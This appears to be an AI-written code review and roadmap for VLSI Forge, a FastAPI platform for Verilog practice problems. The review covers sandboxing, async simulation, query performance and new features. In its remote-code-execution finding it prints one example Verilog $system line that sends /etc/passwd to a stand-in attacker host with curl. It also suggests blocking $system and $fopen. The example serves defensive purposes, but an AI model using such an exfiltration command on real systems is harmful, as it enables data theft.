# VLSI Forge — Full Codebase Review & Improvement Roadmap

**Reviewed by:** Claude (RTL Design + VLSI Skill)
**Date:** March 2026
**Scope:** `backend/server.py`, problem library, design guidelines, architecture

---

## What You've Built — Quick Summary

VLSI Forge is a solid "LeetCode for RTL Design" foundation. You have:
- FastAPI backend with Icarus Verilog integration running real simulations
- JWT + Google OAuth dual authentication
- Monaco editor with Verilog syntax support
- 50+ problems across Easy / Medium / Hard / Very Hard tiers
- Testbench template system with automated pass/fail judging
- VCD file generation and download
- Admin panel for problem and user management
- User dashboard with stats, streaks (placeholder), and submission history

The architecture is clean and the tech choices are solid. Below is a prioritized breakdown of what to fix and what to add to take this to the next level.

---

## 🔴 Critical Issues (Fix First)

### 1. Remote Code Execution — No Sandbox

**File:** `backend/server.py`, `compile_and_simulate_verilog()`

This is the most serious problem. Verilog's `$system()` task lets submitted code run arbitrary shell commands on your server:

```verilog
// A user could submit this and it runs on your machine
initial begin
  $system("curl http://attacker.com/exfil?data=$(cat /etc/passwd)");
end
```

**Fix:** Wrap simulation inside Docker with strict resource limits and no network access:

```bash
docker run --rm \
  --network none \
  --memory 128m \
  --cpus 0.5 \
  --read-only \
  --tmpfs /tmp:size=50m \
  -v /path/to/code:/code:ro \
  iverilog-image \
  sh -c "iverilog -o /tmp/sim /code/design.v /code/tb.v && timeout 5 vvp /tmp/sim"
```

Until Docker is ready, at minimum add a static analysis pre-check to reject `$system`, `$fopen` with write, and `$readmemh`/`$readmemb` pointing outside temp dir.

---

### 2. Temp Directory Leak — VCD Files Disappear After Restart

**File:** `backend/server.py`, line 552–641

`tempfile.mkdtemp()` creates a new dir every submission but **never cleans it up in the success path**. Worse, the absolute path is stored in MongoDB, so after a server restart or OS temp cleanup, all VCD download links break silently with a 404.

**Fix (two parts):**

*Part A — Always cleanup temp dir after reading VCD:*
```python
finally:
    shutil.rmtree(temp_dir, ignore_errors=True)
```

*Part B — Store VCD content in MongoDB (or object storage like S3/MinIO), not a file path:*
```python
# Read and store VCD bytes
if vcd_file.exists():
    vcd_bytes = vcd_file.read_bytes()
    # Store as GridFS or base64 in the submission doc
    submission_doc["vcd_data"] = vcd_bytes  # use GridFS for large files
```

---

### 3. Blocking Async — Simulation Freezes the Event Loop

**File:** `backend/server.py`, line 570–600

`subprocess.run()` is **blocking**. In an `async` FastAPI endpoint, this blocks the entire event loop — no other requests can be served while simulation runs. If two users submit simultaneously, one waits for the other's 10-second timeout.

**Fix:** Use `asyncio.create_subprocess_exec`:
```python
import asyncio

proc = await asyncio.create_subprocess_exec(
    "iverilog", "-o", str(compiled_file), str(design_file), str(testbench_file),
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.PIPE,
    cwd=temp_dir
)
stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10)
```

---

### 4. N+1 Query in `/stats/me`

**File:** `backend/server.py`, lines 843–883

For every passed submission, you make a separate DB call to fetch problem difficulty. With 1000 submissions this is 1000 extra queries.

**Fix:** Aggregate in a single pipeline:
```python
pipeline = [
    {"$match": {"user_id": user.user_id}},
    {"$lookup": {
        "from": "problems",
        "localField": "problem_id",
        "foreignField": "problem_id",
        "as": "problem"
    }},
    {"$unwind": "$problem"},
    {"$group": {
        "_id": None,
        "total_submissions": {"$sum": 1},
        "solved_easy": {"$addToSet": {"$cond": [{"$and": [
            {"$eq": ["$status", "passed"]},
            {"$eq": ["$problem.difficulty", "Easy"]}
        ]}, "$problem_id", None]}},
        # ... etc
    }}
]
```

---

### 5. Route Conflict — `/submissions/user/me` vs `/{submission_id}`

**File:** `backend/server.py`, line 825

The route `GET /submissions/user/me` is registered **after** `GET /submissions/{submission_id}`. FastAPI evaluates routes in order — "user" would match `{submission_id}` first, and you'd get a 404 or wrong result.

**Fix:** Reorder so the specific route comes before the parameterized one, or use a distinct prefix like `/submissions/mine`.

---

## 🟡 Backend Improvements

### 6. Output Comparison Is Too Strict

**File:** `backend/server.py`, line 729–731

```python
passed = output == expected
```

This is raw string equality. Real simulation output has whitespace variations, hex vs decimal formatting (`8'hFF` vs `255`), and `x`/`z` don't-care values. Users will get incorrect "failed" results for correct designs.

**Fix — smarter comparison:**
```python
def normalize_output(s: str) -> str:
    """Normalize simulation output for comparison"""
    lines = [line.strip() for line in s.strip().splitlines()]
    lines = [l for l in lines if l and not l.startswith("//")]  # drop blank/comment lines
    # Normalize hex: 0xff -> 255, 8'hff -> 255
    normalized = []
    for line in lines:
        # Handle SystemVerilog display formats
        line = re.sub(r"\b0x([0-9a-fA-F]+)\b", lambda m: str(int(m.group(1), 16)), line)
        normalized.append(line.lower())
    return "\n".join(normalized)

passed = normalize_output(output) == normalize_output(expected)
```

---

### 7. No Rate Limiting on Submissions

A user can spam the submission endpoint, flooding your Icarus Verilog process pool. Add rate limiting:

```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@api_router.post("/submissions")
@limiter.limit("10/minute")
async def submit_code(request: Request, ...):
    ...
```

---

### 8. No MongoDB Indexes

You're doing `.find_one({"problem_id": ...})` without indexes. Add these at startup:

```python
@app.on_event("startup")
async def create_indexes():
    await db.users.create_index("email", unique=True)
    await db.users.create_index("user_id", unique=True)
    await db.problems.create_index("problem_id", unique=True)
    await db.problems.create_index([("difficulty", 1), ("tags", 1)])
    await db.submissions.create_index("submission_id", unique=True)
    await db.submissions.create_index([("user_id", 1), ("submitted_at", -1)])
    await db.submissions.create_index([("problem_id", 1), ("status", 1)])
    await db.user_sessions.create_index("session_token")
    await db.user_sessions.create_index("expires_at", expireAfterSeconds=0)  # TTL index auto-cleans
```

---

### 9. Testbench Template `{{INPUT}}` Is Too Fragile

**File:** `backend/server.py`, line 713

```python
testbench = problem["testbench_template"].replace("{{INPUT}}", testcase["input_data"])
```

Simple string replace breaks when input data contains Verilog-special characters, or when you need to drive multiple signals with different types. This also makes it impossible to write multi-step stimulus patterns.

**Better approach — structured testcase format:**
```json
{
  "input_data": {
    "a": "4'b1010",
    "b": "4'b0101",
    "cin": "1'b0"
  },
  "expected_output": "4'b1111 1'b0"
}
```

Then generate proper Verilog from structured data, or use named placeholders like `{{a}}`, `{{b}}`, `{{cin}}`.

---

### 10. No Pagination on Admin Endpoints

`GET /admin/users` and `GET /admin/submissions` use `.to_list(10000)` — this loads everything into memory. Add cursor-based or offset pagination:

```python
@api_router.get("/admin/users")
async def get_all_users(request: Request, skip: int = 0, limit: int = 50):
    users = await db.users.find({}, {"_id": 0, "password_hash": 0})\
        .skip(skip).limit(limit).to_list(limit)
    total = await db.users.count_documents({})
    return {"users": users, "total": total, "skip": skip, "limit": limit}
```

---

## 🟢 VLSI-Specific Improvements (The Differentiators)

These are what will make VLSI Forge genuinely better than a generic coding platform.

### 11. In-Browser Waveform Viewer

Downloading a VCD file and opening it in GTKWave is a terrible UX. The #1 feature request will be seeing waveforms in the browser.

**Options ranked by effort:**
- **Low effort:** Embed [WaveDrom](https://wavedrom.com/) — convert simulation `$monitor` output to WaveDrom JSON on the backend and render it client-side. Works for digital signals only, no analog.
- **Medium effort:** Use [vcd-viewer](https://github.com/donn/vcd-viewer) or parse VCD into a simple JSON timeline and render with D3.js or Recharts.
- **Best:** Parse VCD server-side into a structured JSON format and build a custom React component that renders signal rows with zoom and pan.

Minimal VCD → JSON parser in Python:
```python
def parse_vcd_to_json(vcd_content: str) -> dict:
    """Parse VCD into {signal_name: [(time, value), ...]} dict"""
    signals = {}
    id_to_name = {}
    current_time = 0

    for line in vcd_content.splitlines():
        line = line.strip()
        if line.startswith("$var"):
            parts = line.split()
            # $var wire 1 ! signal_name $end
            var_id = parts[3]
            var_name = parts[4]
            id_to_name[var_id] = var_name
            signals[var_name] = []
        elif line.startswith("#"):
            current_time = int(line[1:])
        elif line and line[0] in "01xzXZ":
            value = line[0]
            var_id = line[1:]
            if var_id in id_to_name:
                signals[id_to_name[var_id]].append((current_time, value))

    return {"signals": signals, "max_time": current_time}
```

---

### 12. Verilator Lint Integration — RTL Quality Feedback

After successful simulation, run `verilator --lint-only` and surface warnings to users. This teaches real-world RTL hygiene — inferred latches, sensitivity list issues, unused signals.

```python
lint_result = subprocess.run(
    ["verilator", "--lint-only", "-Wall", str(design_file)],
    capture_output=True, text=True, timeout=10
)
# Return lint_warnings in API response
```

Show these in a "Style & Lint" tab in the UI alongside simulation results.

---

### 13. Yosys Synthesis Stats — Area Estimation

After passing all testcases, optionally run `yosys` to give an estimated gate count. This is a huge differentiator — no other online RTL platform does this.

```tcl
# yosys_synth.tcl
read_verilog design.v
synth -top <top_module>
stat
```

Parse the output to show:
- Number of cells (LUT4, DFF, etc.)
- Estimated area
- Critical path depth

Display this as a "Synthesis Report" card on the submission result page.

---

### 14. SystemVerilog Support

Currently the platform is Verilog-only. SV is the industry standard for modern RTL. Add:
- Pass `-g2012` flag to iverilog for SV support: `iverilog -g2012 ...`
- Language selector in the editor (Verilog / SystemVerilog)
- SV-specific problems: `always_ff`, `always_comb`, interfaces, `logic` type
- SVA assertion checking problems (a unique category no other platform has)

---

### 15. Problem Difficulty Tiers Need a 5th Level

Your problem set goes Easy → Medium → Hard → Very Hard, but you're missing the gap between Hard and Very Hard. Add:
- **Expert:** Full SoC subsystem problems — e.g., "Design a DMA controller with AXI-MM master and APB slave configuration interface"
- **System:** Multi-module integration — e.g., "Connect UART TX + FIFO + AXI slave into a complete peripheral"

Also the `very_hard` tier isn't in the `DifficultyLevel` enum — add it or map it to "Hard".

---

### 16. Structured Learning Paths

Right now problems are flat lists. Add "Learning Paths" — ordered sequences that build on each other:

- **Path: Sequential Logic Fundamentals** — D FF → JK FF → Shift Register → Counter → Clock Divider
- **Path: FSM Design** — Moore FSM → Mealy FSM → Sequence Detectors → Traffic Controller
- **Path: Protocol Design** — UART TX → UART RX → Loopback → FIFO-buffered UART
- **Path: AXI Mastery** — APB Slave → AXI-Lite Slave → AXI-Lite Register Bank → Full AXI-Stream

This increases user retention dramatically — people want to know "what to learn next."

---

### 17. AI Hint System

Integrate Claude API (or any LLM) to give contextual hints without spoiling the solution:

```python
@api_router.post("/problems/{problem_id}/hint")
async def get_hint(request: Request, problem_id: str, hint_data: HintRequest):
    """Generate contextual hint based on user's current code"""
    user = await require_auth(request)
    problem = await db.problems.find_one({"problem_id": problem_id})

    prompt = f"""
    The user is solving: {problem['title']}
    Problem description: {problem['description']}
    Their current code:
    ```verilog
    {hint_data.code}
    ```
    Compilation error (if any): {hint_data.error}

    Give a Socratic hint — point them in the right direction without revealing the answer.
    Focus on the specific RTL concept they're likely struggling with.
    """
    # Call LLM API here
```

Limit to 3 hints per problem per user to preserve the learning experience.

---

## 🔵 Feature Roadmap (Next Level)

### Phase 2 — Competitive Features

**Leaderboard:** Global ranking by:
- Problems solved (weighted by difficulty)
- Submission accuracy rate
- Speed (time-to-first-pass for each problem)
- Current streak

**Timed Contests:** Weekly "RTL Challenges" — 90 minutes, 3 problems (Easy + Medium + Hard). Auto-freeze leaderboard in last 15 minutes. Generate performance certificates.

**Solution Gallery:** After solving a problem, unlock the ability to view "Featured Solutions" — well-commented reference implementations. Great for learning different design styles.

---

### Phase 3 — Enterprise Features

**Company Problem Sets:** Companies like Qualcomm, Intel, AMD, Arm can host private problem banks for interview prep. Users can purchase access. This is the monetization angle.

**Interview Mode:** Timed 45-minute sessions with an interview problem. Records keystroke timeline for review. Companies can use this for remote technical screening.

**Team Competitions:** University team accounts for competitive events like chip design hackathons.

---

### Phase 4 — Advanced RTL Tools

**Static Timing Analysis (Rough):** Use OpenSTA with a simple standard cell library to give worst-case path delay.

**Power Estimation:** Use Yosys + switching activity from VCD to estimate dynamic power.

**Formal Verification Problems:** Integrate SymbiYosys (sby) so problems can be verified formally rather than by simulation — completely different skill set, very advanced.

---

## Summary Priority Table

| Priority | Issue | Effort | Impact |
|----------|-------|--------|--------|
| 🔴 Critical | Docker sandbox for code execution | High | Security |
| 🔴 Critical | Fix VCD file persistence (store in DB) | Medium | Data loss |
| 🔴 Critical | async subprocess (non-blocking sim) | Low | Performance |
| 🔴 Critical | Fix N+1 query in `/stats/me` | Low | Performance |
| 🟡 High | Rate limiting on submissions | Low | Abuse prevention |
| 🟡 High | MongoDB indexes | Low | Performance |
| 🟡 High | Smarter output comparison | Medium | User experience |
| 🟡 High | Fix route conflict `/submissions/user/me` | Low | Correctness |
| 🟢 Differentiator | In-browser waveform viewer | High | UX/Retention |
| 🟢 Differentiator | Verilator lint feedback | Medium | Learning value |
| 🟢 Differentiator | Yosys synthesis stats | Medium | Uniqueness |
| 🟢 Differentiator | SystemVerilog support (`-g2012`) | Low | Industry relevance |
| 🟢 Differentiator | Learning paths / problem ordering | Medium | Retention |
| 🟢 Differentiator | AI hint system | Medium | Learning value |
| 🔵 Future | Leaderboard + contests | High | Engagement |
| 🔵 Future | Company problem sets | High | Monetization |
| 🔵 Future | Formal verification problems | Very High | Uniqueness |

---

*The platform foundation is strong. Fix the security and correctness issues first, then invest in the waveform viewer and Verilator lint — those two alone will make VLSI Forge significantly better than anything else currently available for RTL practice.*
